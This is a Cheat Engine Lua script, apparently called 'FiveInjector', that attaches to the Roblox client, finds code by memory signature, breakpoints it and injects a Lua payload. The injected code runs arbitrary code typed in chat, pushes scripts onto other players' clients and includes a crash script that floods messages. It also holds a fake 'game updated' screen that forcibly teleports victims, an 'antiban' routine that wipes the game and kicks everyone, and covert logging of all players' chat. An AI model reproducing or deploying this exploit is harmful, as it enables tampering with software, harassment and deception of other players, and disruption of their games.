local Exploits, Successes, AddressList, NoRun, Interface = {}, {}, {}, {}, {};
local GlobalOffset = "28";

function GetExploit(index)
	local tab, scan, result = Exploits[index], createMemScan(true);
	memscan_returnOnlyOneResult(scan, true);
	memscan_firstScan(scan, soExactValue, vtByteArray, rtTruncated, table.concat(tab[2], " "), nil, 0, 0x00FFFFFF, "", fsmNotAligned, nil, false, false, false, false);
	memscan_waitTillDone(scan);
	result = memscan_getOnlyResult(scan);
	if result == nil then return nil; end
	result = string.format("%X", result + tab[3]);
	result = string.rep("0", 8 - string.len(result)) .. result;
	return result;
end
function AddExploit(name, hex, offset)
	table.insert(Exploits, {name, hex, offset})
end
function toAddr(num)
	local num = tonumber(num);
	local addr = string.format("%X", num):upper();
	addr = string.rep("0", 8 - string.len(addr)) .. addr;
	return addr;
end


debugger_onBreakpoint = function()
	local function GetAddress(ESPaddr, Offset)
		local ESPaddr, Offset = tostring(ESPaddr) or string.rep("0", 8), tostring(Offset == nil and GlobalOffset or Offset);
		local SCaddr_base = tonumber("0x" .. ESPaddr) + tonumber("0x" .. Offset);
		local SCaddr_cont1, SCaddr_cont2, SCaddr_cont3, SCaddr_cont4 = tostring(string.format("%X", SCaddr_base)), tostring(string.format("%X", SCaddr_base + 1)), tostring(string.format("%X", SCaddr_base + 2)), tostring(string.format("%X", SCaddr_base + 3));
		local SCaddr = (readBytes(SCaddr_cont1) + (readBytes(SCaddr_cont2) * 256) + (readBytes(SCaddr_cont3) * 65536) + (readBytes(SCaddr_cont4) * 16777216));
		return toAddr(SCaddr);
	end
	--if readBytes(GetAddress(toAddr(ESP), GlobalOffset), 1) == 0x0D then
		local JOIN_addr = GetAddress(toAddr(ESP), GlobalOffset);
		local JOIN_len = tonumber("0x"..GetAddress(toAddr(ESP), string.format("%X", tonumber("0x"..GlobalOffset) + 4)));
		local JOIN_script_tbl = readBytes(JOIN_addr, JOIN_len, true);
		local JOIN_script = "";
		table.foreach(JOIN_script_tbl, function(i, v) JOIN_script = JOIN_script .. string.char(v); end);
		local script = JOIN_script .. [==[  repeat wait() until game:service'Players'.LocalPlayer; wait(); game:service'Players'.LocalPlayer.Chatted:connect(function(s) Spawn(function() loadstring(s)() end) end)  LagScript = [[

script:Destroy();

local runService = Game:GetService("RunService").Stepped;
local LagNum = 1250;
local str = "You just got crashed by one of the most powerful hackers on Roblox, how do you feel?";

for i = 1, math.huge do
	if i % LagNum == 0 then runService:wait(); end
	Instance.new("Message", Workspace).Text = str;
end

]]

local function TeleportScript(place_id)
	return [[
		script:Destroy();

		local place_id_str     = ]]..tostring(place_id)..[[;
		local place_id         = tonumber(place_id_str);
		local message_str      = "The owner has updated the game. New features: less lag, improved dynamic lighting, and more! Press the 'Leave' button to play to an updated game!";
		local player           = Game:GetService("Players").LocalPlayer;
		local teleport_service = Game:GetService("TeleportService");
		local run_service      = Game:GetService("RunService").Stepped;
		if player:FindFirstChild("PlayerGui") then
			pcall(function() player.PlayerGui:ClearAllChildren(); end)
		end
		while true do
			if player:FindFirstChild("PlayerGui") then
				local screen_gui, frame_gui, message_gui;
				if not player.PlayerGui:FindFirstChild(" __teleport_updated_place_gui") then
					pcall(function()
						screen_gui      = Instance.new("ScreenGui", player.PlayerGui);
						screen_gui.Name = " __teleport_updated_place_gui";
					end)
				else screen_gui = player.PlayerGui[" __teleport_updated_place_gui"]; end
				if not screen_gui:FindFirstChild(" __teleport_updated_place_frame") then
					pcall(function()
						frame_gui                  = Instance.new("Frame", screen_gui);
						frame_gui.Name             = " __teleport_updated_place_frame";
						frame_gui.ZIndex           = 9;
						frame_gui.Size             = UDim2.new(2, 0, 2, 0);
						frame_gui.Position         = UDim2.new(-.5, 0, -.5, 0);
						frame_gui.BackgroundColor3 = Color3.new();
					end)
				end
				if not screen_gui:FindFirstChild(" __teleport_updated_place_message") then
					pcall(function()
						message_gui                  = Instance.new("TextLabel", screen_gui);
						message_gui.Name             = " __teleport_updated_place_message";
						message_gui.ZIndex           = 10;
						message_gui.Size             = UDim2.new(.9, 0, .3, 0);
						message_gui.Position         = UDim2.new(.05, 0, 0, 0);
						message_gui.BackgroundColor3 = Color3.new();
						message_gui.BorderColor3     = Color3.new();
						message_gui.BorderSizePixel  = 0;
						message_gui.TextWrapped      = true;
						message_gui.TextColor3       = Color3.new(1,1,1);
						message_gui.FontSize         = 8;
						message_gui.Font             = 2;
						message_gui.Text             = message_str;
					end)
				end
			end
			teleport_service:Teleport(place_id);
			pcall(function() Workspace.CurrentCamera.CameraType = 6; end)
			pcall(function() player.Character = nil; end)
			run_service:wait();
		end
	]]
end

local function GetError(not_errored, msg)
	if not_errored then msg = "Running Script" end
	Game.Debris:AddItem((function()
		local hint;
		pcall(function()
			hint=Instance.new("Hint",Workspace.CurrentCamera)
			hint.Text=msg
		end)
		return hint
	end)(), 3)
end

local function FindPlayers(str)
	if not str then return end
	local str,players = str:lower(),{}
	if str == "all" then
		for i, v in next, Game.Players:GetPlayers() do
			players[#players+1] = v
		end
	elseif str:match("others?") then
		for i, v in next, Game.Players:GetPlayers() do
			pcall(function()
				if v ~= Game.Players.LocalPlayer then
					players[#players+1] = v
				end
			end)
		end
	else
		for i, v in next, Game.Players:GetPlayers() do
			pcall(function()
				if v.Name:lower():match("^"..str) then
					players[#players+1] = v
				end
			end)
		end
	end
	return players
end

local function LoadOnClients(players, source)
	if not players or #players == 0 then return end
	local load = function(Player)
		local Script = Instance.new "LocalScript"
		--
		Script.Source = [[
			while script.Name == "LocalScript" do wait() end
			ypcall(loadstring([==============[]]..source..[[]==============]))
		]]
		--
		Script.Parent = Game.Players.LocalPlayer.Character
			or Game.Players.LocalPlayer:FindFirstChild "Backpack"
			or Game.Players.LocalPlayer.CharacterAdded:wait()
		wait(.5)
		Script.Name = "LocalScript "
		Script.Parent = Player.Character
			or Player:FindFirstChild "Backpack"
			or Player.CharacterAdded:wait()
	end
	for _,player in next, players do
		coroutine.wrap(load)(player)
	end
end

coroutine.resume(coroutine.create(function()
		wait(PlayerLoadtime)
		HackerName=game.Players.LocalPlayer.Name
end))
if(AntibanScript)then
		coroutine.resume(coroutine.create(function()
				wait(PlayerLoadtime+.5)
				while true and wait() do
						if(AntibanScript)then
							if not(game.Players:FindFirstChild(HackerName))then
									wait(3.5)
									if(AntibanScript)then
											function workspaceRemove(path)
													for _,v in pairs(path:GetChildren())do
															coroutine.resume(coroutine.create(function(v)
																	if(v:IsA("Script"))or(v:IsA("LocalScript"))then
																			v.Disabled=true
																			v:remove()
																	else
																			v:remove()
																	end
															end),v)
													end
											end
											workspaceRemove(game:GetService('Workspace'))
											for e,i in pairs(game.Players:GetPlayers())do
													coroutine.resume(coroutine.create(function(i) i:remove() end),i)
											end
									end
							end
						end
				end
		end))
end
coroutine.resume(coroutine.create(function()
		wait(PlayerLoadtime)
		game.Players.LocalPlayer:SetSuperSafeChat(false)
        game.Players.LocalPlayer.Chatted:connect(function(msg)
                if string.sub(msg, 1, 3) == "ls " then
                        if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
                                ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
                                ls.Name="lsInserted"
				wait(.2)
				ls.Name="lsRun"
                                ls.Source=string.sub(msg,4)
                                ls.Disabled=true
                                ls.Disabled=false
                        end
                elseif string.sub(msg, 1, 3) == "rs " then
						coroutine.resume(coroutine.create(function(msg)
								local errored,output = ypcall(loadstring(msg:sub(4)))
								GetError(errored,output)
								errored,output = nil
						end),msg)
                elseif string.sub(msg, 1, 3) == "ls/" then
                        if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
                                ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
                                ls.Name="lsInserted"
				wait(.2)
				ls.Name="lsRun"
                                ls.Source=string.sub(msg,4)
                                ls.Disabled=true
                                ls.Disabled=false
                        end
                elseif string.sub(msg, 1, 3) == "rs/" then
						coroutine.resume(coroutine.create(function(msg)
								local errored,output = ypcall(loadstring(msg:sub(4)))
								GetError(errored,output)
								errored,output = nil
						end),msg)
                elseif string.sub(msg, 1, 3) == "cs " then
                				LoadOnClients(FindPlayers(msg:sub(4):match("(%w+)%s")), msg:sub(4):match("%s(.+)"))
                elseif string.sub(msg, 1, 10) == "mediafire " then
                				LoadOnClients(FindPlayers(msg:sub(11):match("(%w+)%s")), msg:sub(11):match("%s(.+)"))
                elseif string.sub(msg, 1, 4) == "lag " then
                				LoadOnClients(FindPlayers(msg:sub(5):match("%w+")), LagScript)
                elseif string.sub(msg, 1, 7) == "hitler " then
                				LoadOnClients(FindPlayers(msg:sub(8):match("%w+")), LagScript)
                --
                elseif string.sub(msg, 1, 3) == "cs/" then
                				LoadOnClients(FindPlayers(msg:sub(4):match("([%w%s]+)/")), msg:sub(4):match("/(.+)"))
                elseif string.sub(msg, 1, 10) == "mediafire/" then
                				LoadOnClients(FindPlayers(msg:sub(11):match("([%w%s]+)/")), msg:sub(11):match("/(.+)"))
                elseif string.sub(msg, 1, 4) == "lag/" then
                				LoadOnClients(FindPlayers(msg:sub(5):match("[%w%s]+")), LagScript)
                elseif string.sub(msg, 1, 7) == "hitler/" then
                				LoadOnClients(FindPlayers(msg:sub(8):match("[%w%s]+")), LagScript)
               	--
		elseif string.sub(msg, 1, 1) == "/" then
				if string.sub(msg, 2, 4) == "sb" then
					chatbool = true
					repeat wait(.01)
						game.Players.LocalPlayer:SetSuperSafeChat(false)
						game.Players:Chat("/sc 2 4")
						game.Players:Chat("/sc 2 7 0")
						game.Players:Chat("/sc 2 7 4")
					until not chatbool
				elseif string.sub(msg, 2, 5) == "nsb" then
					chatbool = false
				elseif string.sub(msg, 2, 7) == "power" then
						if game.Players.LocalPlayer.Character ~= nil then
							if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
								ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
								ls.Name="lsInserted"
								wait(.2)
								ls.Name="lsRun"
								ls.Source=PowerScriptSource
								ls.Disabled=true
								ls.Disabled=false
							end
						end
				elseif string.sub(msg, 2, 7) == "gaara" then
						if game.Players.LocalPlayer.Character ~= nil then
							if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
								ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
								ls.Name="lsInserted"
								wait(.2)
								ls.Name="lsRun"
								ls.Source=GaaraSource
								ls.Disabled=true
								ls.Disabled=false
							end
						end
				elseif string.sub(msg, 2, 6) == "nova" then
						if game.Players.LocalPlayer.Character ~= nil then
							if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
								ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
								ls.Name="lsInserted"
								wait(.2)
								ls.Name="lsRun"
								ls.Source=NovaSource
								ls.Disabled=true
								ls.Disabled=false
							end
						end
				elseif string.sub(msg, 2, 9) == "outgame" then AntibanScript=false
						if game.Players.LocalPlayer.Character ~= nil then
							if not(game.Players.LocalPlayer.Character:FindFirstChild("lsInserted"))then
								ls=Instance.new("LocalScript",game.Players.LocalPlayer.Character)
								ls.Name="lsInserted"
								wait(.2)
								ls.Name="lsRun"
								ls.Source=OutGameSource
								ls.Disabled=true
								ls.Disabled=false
							end
						end
				end
		end
        end)
end))
coroutine.resume(coroutine.create(function()
	wait(PlayerLoadtime)
	while wait() do
		game.Players.LocalPlayer:SetSuperSafeChat(false)
	end
end))
coroutine.resume(coroutine.create(function()
	wait(PlayerLoadtime)
	if ChatHistory then
		coroutine.resume(coroutine.create(function()
		CH=Instance.new("Model",game:GetService("SoundService"))
		CH.Name="ChatHistory"
		for _,v in pairs(game.Players:GetPlayers())do
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end
		game.Players.PlayerAdded:connect(function(v)
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end) end)) coroutine.resume(coroutine.create(function()
		CH2=Instance.new("Model",game:GetService("StarterGui"))
		CH2.Name="ChatHistory"
		for _,v in pairs(game.Players:GetPlayers())do
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH2)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end
		game.Players.PlayerAdded:connect(function(v)
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH2)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end) end)) coroutine.resume(coroutine.create(function()
		CH3=Instance.new("Model",game:GetService("Teams"))
		CH3.Name="ChatHistory"
		for _,v in pairs(game.Players:GetPlayers())do
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH3)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end
		game.Players.PlayerAdded:connect(function(v)
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH3)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end) end)) coroutine.resume(coroutine.create(function()
		CH4=Instance.new("Model",game:GetService("Soundscape"))
		CH4.Name="ChatHistory"
		for _,v in pairs(game.Players:GetPlayers())do
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH4)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end
		game.Players.PlayerAdded:connect(function(v)
			v.Chatted:connect(function(msg)
				chatHistory=Instance.new("StringValue",CH4)
				chatHistory.Name=v.Name
				chatHistory.Value=msg
			end)
		end) end))
	end
end))
X=function(f)
        return coroutine.resume(coroutine.create(f))
end]==]
		local memory = allocateSharedMemory("[ROBLOX]-ScriptTrainer", string.len(script) + 5);
		local mem = toAddr(memory);
		local len = toAddr(string.len(script));
		local success_catch = writeString(mem, script);
		writeBytes(ESP + tonumber("0x" .. GlobalOffset), tonumber("0x" .. mem:sub(7, 8)), tonumber("0x" .. mem:sub(5, 6)), tonumber("0x" .. mem:sub(3, 4)),tonumber("0x" .. mem:sub(1, 2)));
		writeBytes(ESP + tonumber("0x" .. GlobalOffset) + 4, tonumber("0x" .. len:sub(7, 8)), tonumber("0x" .. len:sub(5, 6)), tonumber("0x" .. len:sub(3, 4)),tonumber("0x" .. len:sub(1, 2)));
		--print("[FiveInjector]: Script Execution location " .. GetAddress(toAddr(ESP), GlobalOffset) .. " with length " .. tonumber("0x" .. len));
		pcall(function() debug_removeBreakpoint(EIP); end);
		debug_continueFromBreakpoint(co_run);
		messageDialog("studio.ashx found and " .. (success_catch and "Thejustifierx successful" or "failed to inject."), (success_catch and 2 or 1), 2);
	--else
		--debug_continueFromBreakpoint(co_run)
	--end
end

function Exec()
	local unprotect_mem = {00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 01, 00, 00, 00, 01, 00, 01, 01, 01, 01, 01, 00, 01, 00, 01, 00, 00, 00, 01, 01, 01, 00, 00, 00, 00, 00, 01, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 00, 01, 00, 00, 00, 00, 00, 00, 00, 01, 00, 00, 00, 00, 00, 01, 00, 00, 00}
	writeBytes("00F24118", unprotect_mem);
	pcall(function() object_destroy(Interface.MainFrame); end);
	Exploits, Successes, AddressList, Interface = {}, {}, {}, {};
	--AddExploit("level", {0x89, 0x74, 0x24, 0x0C, 0x89, 0x06, 0xE8}, 4)
	AddExploit("script", {0x83, 0xEC, 0x14, 0x56, 0x57, 0x8B, 0x7C, 0x24, 0x2C, 0x85, 0xFF}, 3)
	for i, v in pairs(Exploits) do
		local exploit = GetExploit(i);
		if (exploit == nil) then
			print("[FiveInjector]: Failed \"" .. v[1] .. "\"");
		else
			pcall(function() debug_removeBreakpoint(exploit); end);
			debug_setBreakpoint(exploit);
			AddressList[v[1]] = exploit;
			table.insert(Successes, v[1]);
			print("[FiveInjector]: Success \"" .. v[1] .. "\" [" .. exploit .. "]");
		end
	end
	print("[FiveInjector]: " .. tostring(#Successes) .. "/" .. tostring(#Exploits) .. " exploits found.")

	if #Successes == #Exploits then
		print("[FiveInjector]: Attached successfully. Listening for studio.ashx now...");
	else
		messageDialog("[FiveInjector]: Initializing failed. FiveInjector fails to launch", 1, 2);
	end
end

function myCheck(_)
	local id = getProcessIDFromProcessName("RobloxPlayerBeta.exe");
	if id ~= nil then
		for i, v in pairs(NoRun) do
			if v == id then
				return
			end
		end
		table.insert(NoRun, id);
		openProcess(id);
		debugProcess(2);
		Exec();
	else
		local id2 = getProcessIDFromProcessName("RobloxPlayer.exe");
		if id2 ~= nil then
			for i, v in pairs(NoRun) do
				if v == id2 then
					return
				end
			end
			table.insert(NoRun, id2);
			openProcess(id2);
			debugProcess(2);
			Exec();
		end
	end
end

t = createTimer(nil)
timer_setInterval(t, 500)
timer_onTimer(t, myCheck)
timer_setEnabled(t, true)
